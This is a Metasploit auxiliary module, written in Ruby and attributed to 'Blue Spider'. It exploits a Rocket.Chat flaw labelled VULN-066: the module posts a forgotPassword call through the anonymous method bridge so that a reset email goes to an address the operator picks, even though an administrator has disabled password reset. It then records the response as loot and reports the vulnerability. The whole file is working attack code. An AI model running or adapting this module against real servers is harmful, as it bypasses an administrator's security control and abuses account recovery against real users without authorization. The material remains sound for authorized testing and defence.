class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat password-reset mail when reset is disabled (VULN-066)',
        'Description' => %q{
          Rocket.Chat still sends password-reset mail through the anonymous
          forgotPassword method when an administrator has disabled password reset, so
          the control does not hold and an attacker drives account recovery anyway.
          This module calls the anonymous method bridge for EMAIL and reports that a
          reset was triggered despite the disabled setting. The operator supplies the
          address; the module creates nothing.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/method.callAnon/forgotPassword']),
      OptString.new('EMAIL', [true, 'The account email to send a reset to', 'alice@lab.invalid'])
    ])
  end

  def run
    res = forgot(target_uri.path)
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = ddp_ok(res)
    fail_with(Failure::NotVulnerable, 'VULN-066: the attack did not land') unless hit

    print_good("#{peer} - VULN-066: exploited")
    print_good("#{peer} - forgotPassword accepted for #{datastore['EMAIL']} through the anonymous method bridge, with password reset disabled")
    print_status('  a reset link is mailed; the documented REST route would answer \'Password reset is not enabled\'')
    path = store_loot('blue_spider.vuln_066', 'text/plain', rhost, res.body.to_s, 'vuln_066.txt', 'VULN-066 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-066 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def forgot(path)
    frame = { 'msg' => 'method', 'id' => '1', 'method' => 'forgotPassword',
              'params' => [{ 'email' => datastore['EMAIL'] }] }.to_json
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(path),
      'ctype' => 'application/json',
      'data' => { 'message' => frame }.to_json
    })
  end

  def ddp_ok(res)
    m = JSON.parse(parse_json(res)['message'] || '{}')
    m['msg'] == 'result' && !m.key?('error')
  rescue StandardError
    false
  end
end
